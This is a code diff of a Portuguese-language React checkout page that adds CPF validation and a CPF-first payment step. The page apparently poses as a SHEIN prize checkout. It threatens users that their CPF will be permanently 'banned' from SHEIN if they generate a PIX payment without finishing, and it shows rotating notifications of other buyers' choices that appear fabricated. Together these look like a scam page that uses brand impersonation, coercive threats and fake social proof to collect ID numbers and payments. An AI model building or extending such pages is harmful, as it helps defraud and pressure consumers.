@@ -53,6 +53,7 @@ const Checkout = () => {
   const { toast } = useToast();
   const premio = 2690;
   const [step, setStep] = useState(1);
+  const [subStep, setSubStep] = useState(1); // Sub-etapa dentro do step 2
   const [nome, setNome] = useState("");
   const [email, setEmail] = useState("");
   const [cpf, setCpf] = useState("");
@@ -93,9 +94,59 @@ const Checkout = () => {
     return value;
   };
 
+  const validarCPF = (cpf: string) => {
+    const numbers = cpf.replace(/\D/g, "");
+    
+    if (numbers.length !== 11) return false;
+    
+    // Verifica se todos os dígitos são iguais
+    if (/^(\d)\1+$/.test(numbers)) return false;
+    
+    // Validação dos dígitos verificadores
+    let sum = 0;
+    for (let i = 0; i < 9; i++) {
+      sum += parseInt(numbers.charAt(i)) * (10 - i);
+    }
+    let digit = 11 - (sum % 11);
+    if (digit >= 10) digit = 0;
+    if (digit !== parseInt(numbers.charAt(9))) return false;
+    
+    sum = 0;
+    for (let i = 0; i < 10; i++) {
+      sum += parseInt(numbers.charAt(i)) * (11 - i);
+    }
+    digit = 11 - (sum % 11);
+    if (digit >= 10) digit = 0;
+    if (digit !== parseInt(numbers.charAt(10))) return false;
+    
+    return true;
+  };
+
   const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = formatCPF(e.target.value);
     setCpf(formatted);
+  };
+
+  const handleCpfValidation = () => {
+    if (!cpf.trim()) {
+      toast({
+        title: "CPF obrigatório",
+        description: "Por favor, insira seu CPF.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (!validarCPF(cpf)) {
+      toast({
+        title: "CPF inválido",
+        description: "Por favor, insira um CPF válido.",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setSubStep(2); // Avança para mostrar ofertas e finalização
   };
 
   const handleStepOne = () => {
@@ -236,59 +287,82 @@ const Checkout = () => {
             Escolha o seu método de pagamento preferido
           </p>
 
-          {/* Card PIX */}
-          <div className="border-4 border-cyan-400 rounded-lg p-3 sm:p-6 mb-4 sm:mb-6 bg-cyan-50">
-            <div className="flex items-center gap-2 sm:gap-3 mb-3 sm:mb-4">
-              <div className="w-6 h-6 sm:w-8 sm:h-8 rounded-full border-2 border-cyan-500 bg-white flex items-center justify-center">
-                <div className="w-3 h-3 sm:w-4 sm:h-4 rounded-full bg-cyan-500"></div>
-              </div>
-              <span className="bg-green-500 text-white px-3 sm:px-4 py-1 rounded-full text-xs sm:text-sm font-bold">
-                PIX
-              </span>
-              <span className="bg-green-600 text-white px-2 sm:px-3 py-1 rounded-full text-[10px] sm:text-xs font-bold">
-                APROVAÇÃO IMEDIATA
-              </span>
-            </div>
-
-            <ul className="text-xs sm:text-sm text-gray-700 space-y-1 sm:space-y-2 mb-3 sm:mb-4">
-              <li>- Liberação imediata!</li>
-              <li>- É simples, só usar o aplicativo do seu banco para pagar PIX.</li>
-              <li>
-                - Super seguro. O pagamento PIX foi desenvolvido pelo Banco Central para
-                facilitar pagamentos.
-              </li>
-            </ul>
-
-            {/* Aviso Importante */}
-            <div className="bg-yellow-100 border-l-4 border-yellow-500 p-3 sm:p-4 rounded">
-              <div className="flex items-start gap-2">
-                <span className="text-xl sm:text-2xl shrink-0">⚠️</span>
-                <div>
-                  <p className="font-bold text-xs sm:text-sm mb-2">AVISO IMPORTANTE</p>
-                  <p className="text-xs sm:text-sm text-gray-800">
-                    <span className="font-bold">ATENÇÃO:</span> Caso você gere um pagamento PIX e
-                    não finalize a compra, seu CPF será automaticamente{" "}
-                    <span className="font-bold">BANIDO</span> da plataforma SHEIN e você ficará{" "}
-                    <span className="font-bold">IMPOSSIBILITADO</span> de participar e comprar em
-                    nossa plataforma permanentemente.
-                  </p>
+          {subStep === 1 && (
+            <>
+              {/* Card PIX - Sub-etapa 1: Apenas CPF */}
+              <div className="border-4 border-cyan-400 rounded-lg p-3 sm:p-6 mb-4 sm:mb-6 bg-cyan-50">
+                <div className="flex items-center gap-2 sm:gap-3 mb-3 sm:mb-4">
+                  <div className="w-6 h-6 sm:w-8 sm:h-8 rounded-full border-2 border-cyan-500 bg-white flex items-center justify-center">
+                    <div className="w-3 h-3 sm:w-4 sm:h-4 rounded-full bg-cyan-500"></div>
+                  </div>
+                  <span className="bg-green-500 text-white px-3 sm:px-4 py-1 rounded-full text-xs sm:text-sm font-bold">
+                    PIX
+                  </span>
+                  <span className="bg-green-600 text-white px-2 sm:px-3 py-1 rounded-full text-[10px] sm:text-xs font-bold">
+                    APROVAÇÃO IMEDIATA
+                  </span>
                 </div>
-              </div>
-            </div>
 
-            {/* Campo CPF */}
-            <div className="mt-3 sm:mt-4">
-              <Label className="text-xs sm:text-sm font-semibold mb-2 block">CPF</Label>
-              <Input
-                type="text"
-                placeholder="000.000.000-00"
-                value={cpf}
-                onChange={handleCpfChange}
-                maxLength={14}
-                className="h-12 sm:h-14 text-sm sm:text-base bg-white"
-              />
-            </div>
-          </div>
+                <ul className="text-xs sm:text-sm text-gray-700 space-y-1 sm:space-y-2 mb-3 sm:mb-4">
+                  <li>- Liberação imediata!</li>
+                  <li>- É simples, só usar o aplicativo do seu banco para pagar PIX.</li>
+                  <li>
+                    - Super seguro. O pagamento PIX foi desenvolvido pelo Banco Central para
+                    facilitar pagamentos.
+                  </li>
+                </ul>
+
+                {/* Aviso Importante */}
+                <div className="bg-yellow-100 border-l-4 border-yellow-500 p-3 sm:p-4 rounded">
+                  <div className="flex items-start gap-2">
+                    <span className="text-xl sm:text-2xl shrink-0">⚠️</span>
+                    <div>
+                      <p className="font-bold text-xs sm:text-sm mb-2">AVISO IMPORTANTE</p>
+                      <p className="text-xs sm:text-sm text-gray-800">
+                        <span className="font-bold">ATENÇÃO:</span> Caso você gere um pagamento PIX e
+                        não finalize a compra, seu CPF será automaticamente{" "}
+                        <span className="font-bold">BANIDO</span> da plataforma SHEIN e você ficará{" "}
+                        <span className="font-bold">IMPOSSIBILITADO</span> de participar e comprar em
+                        nossa plataforma permanentemente.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Campo CPF */}
+                <div className="mt-3 sm:mt-4">
+                  <Label className="text-xs sm:text-sm font-semibold mb-2 block">CPF</Label>
+                  <Input
+                    type="text"
+                    placeholder="000.000.000-00"
+                    value={cpf}
+                    onChange={handleCpfChange}
+                    maxLength={14}
+                    className="h-12 sm:h-14 text-sm sm:text-base bg-white"
+                  />
+                </div>
+
+                {/* Botão Continuar */}
+                <Button
+                  onClick={handleCpfValidation}
+                  className="w-full h-12 sm:h-14 bg-blue-600 hover:bg-blue-700 text-white text-sm sm:text-lg font-bold rounded-lg mt-4"
+                >
+                  CONTINUAR
+                </Button>
+              </div>
+
+              {/* Notificação flutuante */}
+              <div className="fixed bottom-4 left-1/2 -translate-x-1/2 bg-gray-700 text-white px-3 sm:px-4 py-2 sm:py-3 rounded-lg shadow-lg flex items-center gap-2 sm:gap-3 max-w-[calc(100%-2rem)] sm:max-w-md z-50">
+                <div className="w-2 h-2 sm:w-3 sm:h-3 bg-green-500 rounded-full shrink-0 animate-pulse"></div>
+                <p className="text-[10px] sm:text-sm">
+                  <span className="font-bold">{notificacaoAtual.nome} escolheu o {notificacaoAtual.produto}</span>
+                </p>
+              </div>
+            </>
+          )}
+
+          {subStep === 2 && (
+            <>
 
           {/* Você está adquirindo */}
           <div className="mb-4 sm:mb-6">
@@ -512,6 +586,8 @@ const Checkout = () => {
               <span className="font-bold">{notificacaoAtual.nome} escolheu o {notificacaoAtual.produto}</span>
             </p>
           </div>
+            </>
+          )}
         </div>
       )}
     </div>
